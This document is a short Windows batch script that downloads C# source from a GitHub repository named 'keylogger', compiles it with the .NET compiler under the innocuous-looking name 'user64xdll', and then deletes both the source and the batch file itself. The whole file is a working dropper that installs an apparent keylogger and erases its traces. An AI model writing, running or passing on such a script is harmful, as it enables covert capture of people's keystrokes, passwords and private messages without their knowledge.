@echo off
curl -O https://raw.githubusercontent.com/w3irdguy/keylogger/main/user64xdll.cs
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe user64xdll.cs
erase user64xdll.cs & erase startkeys.bat 
